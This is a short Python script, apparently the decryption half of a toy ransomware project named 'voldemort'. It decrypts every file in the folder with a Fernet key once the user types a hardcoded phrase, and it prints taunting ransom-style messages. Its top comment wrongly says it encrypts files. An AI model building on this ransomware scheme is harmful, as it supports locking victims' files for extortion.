import os
from cryptography.fernet import Fernet
# A file that will encrypt all files in a folder

files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

# Opens the secret key specified in voldemort.py and saves it as a variable
with open("key.key", "rb") as thekey:
    secretKey = thekey.read()
# Sets a decryption phrase
secretPhrase  = "key"
# Asks user to enter secret phrase
userPhrase = input("Enter the secret phrase to decrypt your files\n> ")
# Checks if secret phrase is correct
# if true it will decrypt all files
if userPhrase == "key":
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretKey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("yor computer files back :)")
# if false tell user that its wrong
else:
    print("wrong lol")
